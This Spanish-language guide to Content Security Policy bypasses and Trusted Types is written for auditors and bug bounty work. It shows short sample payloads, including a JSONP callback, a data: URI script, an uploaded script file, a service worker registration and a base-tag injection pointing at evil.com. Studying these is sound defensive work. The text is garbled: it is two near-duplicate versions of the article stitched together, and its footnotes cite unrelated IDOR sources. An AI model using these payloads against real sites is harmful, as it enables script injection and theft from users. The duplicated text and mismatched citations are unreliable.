# CSP Bypass y Trusted Types 

## Resumen

Las políticas de Content Security Policy (CSP) son uno de los controles más eficaces contra XSS, inyección de scripts y ataques de cadena de suministro en el navegador. Pero los bypass de CSP siguen siendo frecuentes debido a configuraciones laxas, integraciones con terceros, errores en wildcards y mutaciones en el DOM. Trusted Types, la mitigación más avanzada, refuerza la protección contra XSS DOM-based, pero también presenta limitaciones y bypasses documentados.[^2]

---

## Fundamentos de CSP

CSP es una cabecera que instruye al navegador sobre qué fuentes de contenido (scripts, imágenes, estilos, frames) puede cargar y ejecutar la página. Ejemplo:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; base-uri 'none'; form-action 'self';
```

Las directivas más relevantes:

- **script-src:** controla fuentes de JS ejecutable.
- **object-src, frame-src, child-src:** restringen iframes, plugins.
- **img-src, style-src, font-src:** restringen otros recursos.
- **connect-src:** controla endpoints de fetch, websockets, XHR.
- **base-uri, form-action, frame-ancestors:** evitan redirecciones y clickjacking.
- **report-uri, report-to:** logging de violaciones.

---

## Vectores y Técnicas Comunes de Bypass

### 1. Wildcards y Dominios Demasiado Amplios

- **script-src 'self' *.trusted.com:** permite subdominios comprometidos.
- **Permitir scripts inline 'unsafe-inline':** abre XSS clásico.

### 2. JSONP, Angular, APIs de Terceros

Carga de scripts desde endpoints JSONP, servicios que ejecutan callbacks controlados por el atacante:

```html
<script src="https://trusted.com/api/v1/jsonp?callback=alert(1)"></script>
```

### 3. Subida de Archivos Ejecutables

Si la política permite cargar scripts desde `/uploads`, un atacante sube un archivo JS propio y lo ejecuta:

```html
<script src="/uploads/payload.js"></script>
```

### 4. Data URIs, blob: y Schemes Prohibidos (o Permitidos)

Permitir `data:`, `blob:`, `filesystem:` en script-src permite evasión directa:

```html
<script src="data:text/javascript,alert(1)"></script>
```

Permitir `unsafe-eval`/`unsafe-hashes` revive riesgos de cadenas dinámicas.

### 5. Base URI Injection

Si se puede inyectar `<base href="https://evil.com/">`, todos los scripts relativos apuntan al dominio controlado.

### 6. Mutaciones DOM/Cadena de Bypass

- XSS via postMessage, innerHTML, o chains a través de trusted domains que alojan payloads maliciosos.
- Uso de “script gadgets”: scripts existentes en la app que evalúan fragmentos controlados por el usuario tras una manipulación indirecta.

### 7. Service Worker Bypass

Un service worker malicioso registrado desde una ruta permitida por CSP puede interceptar scripts, responses y modificar contenido fuera del alcance del CSP:[^3]

```javascript
navigator.serviceWorker.register('/uploads/sw.js');
```

---

## Métodos de Detección y Pruebas

### Testing Manual

- Modifica CSP progresivamente para identificar directivas débiles.
- Intenta inyectar scripts desde uploads, data URIs, subdominios.
- Probar endpoints JSONP y otros callbacks dinámicos.
- Inspección dinámica desde DevTools: ver reglas activas en "Security" y errores CSP en “Console”.

### Automatización

- **Nuclei:** templates para CSP misconfig y bypass:[^4]

```bash
nuclei -u https://victima.com -t csp-bypass/
```

- **csp-evaluator:** herramienta de Google para analizar cabeceras de CSP.
- **Burp Suite Extension:** CSP Auditor, Passive Scanner (CSP weaknesses).

### Ejemplo de Reporte

```markdown
## CSP Bypass – XSS Ejecutable pese a Política Activa
**Severity:** High  
**Resumen:** El endpoint /profile permite subida y ejecución de scripts via uploads, evadiendo CSP mediante wildcard en script-src.
**PoC:**
1. Subir payload.js a /uploads/payload.js
2. Inyectar `<script src="/uploads/payload.js"></script>` en un campo vulnerable
3. El script ejecuta pese a la política
**Mitigación:** Limitar script-src a orígenes estrictamente necesarios, bloquear uploads ejecutables, auditar subdominios y endpoints callback dinámicos.
```

---

## Fundamentos y Rol de Trusted Types

**Trusted Types** es una API de seguridad que refuerza el DOM XSS en navegadores modernos (Chrome, Edge):

- Restringe sinks peligrosos (`element.innerHTML`, `eval`, `setTimeout`)
- Solo acepta objetos Trusted Types, no strings arbitrarios
- Permite definir políticas (policy) para transformar strings seguras en TrustedScript/TrustedHTML

**Implementación básica:**

```javascript
window.trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input),
  createScript: (input) => DOMPurify.sanitize(input)
});
```

**En HTML:**

```html
<meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types default;">
```

Con esta configuración, sólo scripts que pasen por la policy pueden ser inyectados en innerHTML/script-src.

---

## Limitaciones y Bypass de Trusted Types

- **Políticas laxas:** Si la política convierte cualquier input en TrustedType sin sanitizar, no aporta defensa.
- **Gadgets y chains:** Si un script legítimo implementa su propia Trusted Types policy y esta es explotable/insegura, se puede encadenar.
- **Falta de soporte:** Firefox y navegadores antiguos no lo implementan; solo defensa para browsers modernos.
- **Bypass via Third-Party:** Bibliotecas de terceros mal configuradas pueden crear Trusted Types sin validar.
- **No mitiga XSS server-side ni bypasses de CSP tradicionales.**

---

## Recomendaciones de Configuración Segura

1. **CSP estricta:**
   - No wildcards, nada de `unsafe-inline`, solo fuentes explícitas.
   - Requiere Trusted Types para scripts.
2. **Trusted Types por defecto más policy whitelist:**
   - Usar DOMPurify u otro sanitizador robusto.
3. **Bloquear data:, blob: y cualquier source dinámica innecesaria.**
4. **No permitir subidas ni scripts en rutas de archivos dinámicos.**
5. **Revisar integración de librerías externas y puntos de innerHTML/eval.**
6. **Monitorizar continuamente violations CSP/Trusted Types en logs y alertas.**

---

## Referencias y Herramientas

- https://csp-evaluator.withgoogle.com/
- https://xsleaks.dev/docs/attacks/csp-bypass/
- MDN Web Docs – CSP y Trusted Types
- Google Web Fundamentals – Trusted Types API
- Nuclei, csp-auditor, CSP Auditor (Burp)

---

## Consideraciones para Bug Bounty y Auditoría

- Prueba cadenas y gadgets, rutas de uploads, callbacks, endpoints JSONP, wildcards peligrosos.
- Analiza cabeceras, intenta inyección desde input controlado en todos los contexts DOM sink.
- Valida presence y robustez de Trusted Types (policy, enforcement, fallback).
- Contextualiza el impacto y demuestra bypass con PoC funcional y evidencia de ejecución.

---

## Conclusión

CSP y Trusted Types son defensas de vanguardia, pero no infalibles. Las cadenas modernas de ataque combinan errores de configuración CSP, endpoints inseguros y gadgets JS para lograr XSS o supply chain compromise aunque la cobertura parezca robusta. La combinación de testing manual, automatizado y revisión de integraciones es esencial para prevenir bypass y exploits reales en producción.\# CSP Bypass y Trusted Types – Guía Completa

## Resumen

CSP (Content Security Policy) es esencial para prevenir XSS, inyección de scripts y ataques de cadena de suministro. Sin embargo, bypasses son comunes por configuraciones laxas, cadenas gadgets, endpoints dinámicos y errores en integración de terceros. Trusted Types es la defensa avanzada contra DOM XSS, forzando la sanitización centralizada de sinks críticos, aunque tiene limitaciones propias y es bypassable en contextos reales.[^1]

---

## Fundamentos de CSP

CSP especifica via cabecera HTTP qué recursos, scripts, imágenes y frames puede cargar la web.
**Directivas clave**:

- `script-src`: fuentes de JS.
- `object-src`, `frame-ancestors`, `base-uri`: controles extra para plugins, iframes y URLs base.
- `report-uri`/`report-to`: logging.

**Ejemplo:**

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com; object-src 'none'; frame-ancestors 'none';
```

---

## Técnicas Avanzadas de Bypass

### Break CSP por Wildcards o Fuentes Laxas

- Uso de `*`, subdominios no controlados, wildcard en script-src.
- Cadena: script-src 'self' *.trusted.com permite takeover de subdominio.

### JSONP, APIs y Endpoints Dinámicos

- Script JSONP de terceros vulnerable a callback controlado:
  `<script src="https://api.trusted.com/jsonp?callback=evil"></script>`
- Endpoints de analytics con eval/dinámica controlados por el atacante.

### Subida y Ejecución de Archivos

- Si uploads están permitidos en script-src, un atacante sube y ejecuta su propio JS:
  `<script src="/uploads/evil.js"></script>`

### Data/Blob Schemes, Inline y Eval

- Permitir `data:`, `blob:` en CSP revive vector XSS.
- Permitir `unsafe-inline` o `unsafe-eval` permite JS arbitrario y sintéticamente generado.

### Base URI y Chain

- `<base href="https://evil.com/">` redirige recursos a un dominio controlado.

### Mutación DOM y Gadget Chains

- Cadenas en el frontend donde un script legítimo evalúa un input controlado tras una transformación indirecta.
- Bypass mediante APIs postMessage, gadgets, innerHTML/cadena controlada.

### Service Worker - Cadena Supply Chain

- Payload subido o servido desde ruta permitida que registra un SW `evil.js` y toma control de recursos y rutas permitidas por CSP.[^3]

---

## Detección y Testing

### Manual

1. Inspección de CSP y fuentes permitidas (`devtools > Security` y `Console`)
2. Inyección de scripts en rutas permitidas por wildcard, uploads o subdominios.
3. Probar endpoints de terceros para JSONP, eval, o cadenas gadgets.
4. Mutar DOM buscando sinks peligrosos (innerHTML, eval, Function, setTimeout).

### Automatizada

- **nuclei** (templates csp-misconfig/bypass)
- **csp-evaluator** (by Google)
- **Burp Suite Passive Scanner + CSP Auditor**
- **SecurityHeaders.io** comparador de políticas

---

## Ejemplo de Reporte

```markdown
## CSP Bypass via Upload y Wildcard  
**Severidad**: Crítica  
**PoC**:
1. Subir payload JS a `/uploads/evil.js`
2. Insertar `<script src="/uploads/evil.js"></script>` en campo vulnerable
3. El script se ejecuta pese a CSP
**Mitigación**: Limitar `script-src` a orígenes estrictos sin wildcards, bloquear subida de archivos ejecutables, revisar gadgets.
```

---

## Fundamentos de Trusted Types

- Solo permite sink peligrosos (`innerHTML`, `eval`, etc) si el payload es TrustedType.
- Solo navegadores modernos (principalmente Chrome)
- Requiere definir política default explícita.

**Implementación:**

```javascript
window.trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
```

**En HTML:**

```html
<meta http-equiv="Content-Security-Policy" content="require-trusted-types-for 'script'; trusted-types default;">
```

---

## Limitaciones y Bypass

- **Políticas mal diseñadas**: Si la política acepta cualquier input, no mitiga XSS.
- **Chains gadgets**: Si el código legítimo transforma datos inseguros y luego los convierte en TrustedType.
- **Soporte parcial**: Solo en browsers recientes.
- **Integraciones de terceros**: Bibliotecas que crean TrustedType inseguros o pasan sinks sin sanitize.

---

## Mejores Prácticas

1. CSP sin wildcards ni 'unsafe-inline'/eval.
2. Trusted Types con política que solo acepte output de sanitizador robusto (DOMPurify).
3. No permitir uploads ejecutables ni scripts desde rutas dinámicas.
4. Auditar subdominios, callbacks, gadgets encadenados y endpoints de terceros.
5. Revisar logs CSP y Trusted Types violations.

---

## Consideraciones para Bug Bounty/Pentesting

- Busca sinks gadgets encadenados y cadenas mutables de input-control-hasta-sink.
- Testea uploads, callbacks, scripts alojados en orígenes permitidos.
- Usa csp-evaluator y nuclei para un testing exhaustivo/automatizado.
- Prioriza frameworks con integraciones peligrosas: analytics, chat, widgets.

[^1]: https://portswigger.net/web-security/access-control/idor
    
[^2]: https://www.webasha.com/blog/what-is-an-example-of-a-real-bug-bounty-report-where-idor-was-used-to-exploit-a-banking-application
    
[^3]: https://infosecwriteups.com/️-hunting-idor-a-deep-dive-into-insecure-direct-object-references-b550a9f77333
    
[^4]: https://spyboy.blog/2024/09/19/idor-vulnerabilities-finding-exploiting-and-securing/
    
[^5]: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
